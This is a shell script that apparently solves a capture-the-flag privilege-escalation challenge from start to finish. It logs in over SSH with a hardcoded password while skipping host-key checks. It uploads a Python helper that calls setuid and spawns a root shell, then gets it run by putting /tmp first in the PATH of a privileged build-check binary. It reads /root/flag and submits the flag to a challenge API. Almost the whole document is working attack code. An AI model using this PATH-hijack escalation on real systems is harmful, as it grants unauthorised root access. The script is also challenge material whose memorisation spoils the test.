#!/bin/sh
set -eu

HOST=172.20.0.141
USER=buildbot
PASSWORD='OrbitRelay-7q!'
helper=$(mktemp)
trap 'rm -f "$helper"' EXIT HUP INT TERM

nmap -n -Pn -p 22 --open "$HOST" >/dev/null

cat > "$helper" <<'PYTHON'
#!/usr/bin/python3
import os
os.setuid(0)
os.execl("/bin/sh", "sh", "-c", "cat /root/flag; cat /root/.escalation-proof")
PYTHON

output=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$USER@$HOST" 'cat > /tmp/build-helper && chmod 0755 /tmp/build-helper && PATH=/tmp:/usr/bin:/bin /usr/local/bin/build-check' < "$helper")
printf '%s\n' "$output"

flag=$(printf '%s\n' "$output" | grep -oE 'BSY\{[^}]+\}' | head -n 1)
if [ -z "$flag" ]; then
  echo 'Could not extract the flag from the root output.' >&2
  exit 1
fi

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-9c6c3b\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
echo
